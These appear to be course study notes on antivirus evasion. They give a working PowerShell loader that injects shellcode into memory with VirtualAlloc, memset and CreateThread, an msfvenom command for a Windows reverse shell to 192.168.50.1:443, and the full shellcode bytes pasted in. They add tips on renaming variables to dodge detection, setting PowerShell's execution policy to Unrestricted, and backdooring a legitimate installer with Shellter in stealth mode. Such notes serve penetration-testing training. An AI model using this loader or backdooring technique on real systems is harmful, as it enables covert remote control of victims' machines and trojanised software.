
>[!info]- Info - The components of an antivirus
>- The _file engine_ either parses the full filesystem or a newly downloaded file against the signatures database.
>- The _memory engine_ inspects each process's memory space at runtime.
>- The _network engine_ inspects incoming and outgoing network traffic on the local network interface
>- The _disassembler_ disassembles any malware that packed up or ciphered and then opens it in a _sandbox_.
#### Remote Process Memory Injection

>[!info]- Info - What is remote process memory injection?
>RPMI attempts to inject the payload into another valid Portable Execute file that is not malicious.

>[!exploit]- Exploit - We can inject our malicious code into the memory space of another file

>[!code]- Create the memory injection script
>1. The script imports _VirtualAlloc_ and _CreateThread_ from **kernel32.dll** as well as _memset_ from **msvcrt.dll**. These functions allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory.
>2. The scripts main logic starts by allocating a block of memory using _VirtualAlloc_, which takes each byte of the of the payload stored in the _$sc_ byte array and writes it to our newly-allocated memory block using _memset_.
>3. The in-memory payload is then executed in a separate thread using the _CreateThread_ API.
>```powershell
><# 1 #>
>$code = '  
>[DllImport("kernel32.dll")]  
>public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
>
>[DllImport("kernel32.dll")]  
>public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
>
>[DllImport("msvcrt.dll")]  
>public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
>
>$var2 =  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
>
><# 2 #>
>[Byte[]];  
>[Byte[]]$var1 = \<place your shellcode here>;
>$size = 0x1000;
>
>if ($var1.Length -gt 0x1000) {$size = $var1.Length};
>
>$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
>
>for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
>
><# 3 #>
>$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
>```

>[!code]- Generate a payload
>```bash
>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
>```

>[!code]- Copy the payload into the injection script
>```powershell
>$code = '  
[DllImport("kernel32.dll")]  
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
>
[DllImport("kernel32.dll")]  
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
>
[DllImport("msvcrt.dll")]  
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
>
$var1 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions - passthru;
>
[Byte[]];  
[Byte[]] $var2 = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72, 0x6f,0x6a,0x0,0x53,0xff,0xd5;
>
$size = 0x1000;  
if ($var2.Length -gt 0x1000) {$size = $var2.Length}; $x = $var1::VirtualAlloc(0,$size,0x3000,0x40);
>
for ($i=0;$i -le ($var2.Length-1);$i++) {$var1::memset([IntPtr]($x.ToInt32()+$i), $var2[$i], 1)};
>
>$var1::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
>```

>[!code]- Change the script's variable names to something more generic (non-mandatory)
>But it has a higher change of evading AV. Eg., I changed:
>- `$winFunc` to `$var1`
>- `$sc` to `$var2`
>- `Win32` to `iWin32`

>[!code]- Execute the script
>The payload used in the script (`bypass.ps1`) is for x86, so we should launch the x86 version of PowerShell.
>
>We may need to change the execution policy to allow the execution of scripts. The below is an alternative method to `powershell -ep bypass` (which bypasses it on a per script basis rather than globally).
>```powershell
>PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
>PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
>
><# Setup a listener on Kali then execute the script #>
>PS C:\Users\offsec\Desktop> .\bypass.ps1
>```
#### Automating the Process with Shellter

>[!info]- Info - What is Shellter?
>Shellter is a dynamic shellcode injection tool capable of bypassing antivirus software. It uses a number of novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload.

>[!exploit]- Exploit - Shellter can inject malicious code into a non-malicious executable file

>[!code]- Install wine and Shellter
>Wine is a compatibility layer capable of running win32 applications on several POSIX-compliant operating systems.
>
>```bash
>kali@kali:~$ sudo apt install wine
>root@kali:~# dpkg --add-architecture i386 && apt-get update && apt-get install wine32
>``` 
>kali@kali:~$ apt-cache search shellter
>kali@kali:~$ sudo apt install shellter
>```

>[!code]- Generate the malicious executable with Shellter
>1. Run Shellter (`shellter` command), then selecting Auto mode (**A**):
>2. Set the PE target to a suitable non-malicious executable, eg: `spotifysetup.exe`
>3. Enable _Stealth Mode_ if you want to have the executable run as normal when executed
>4. Select a payload. Note, custom payloads need to terminate by exiting the current thread if Stealth Mode is enabled, to restore the execution flow.
>5. Once payload type is selecting and the relevant parameters have been entered (Kali IP and listener port number), generate the malicious PE file.

>[!code]- Transfer the malicious executable to the target and execute it
>Setup a listener on Kali first.



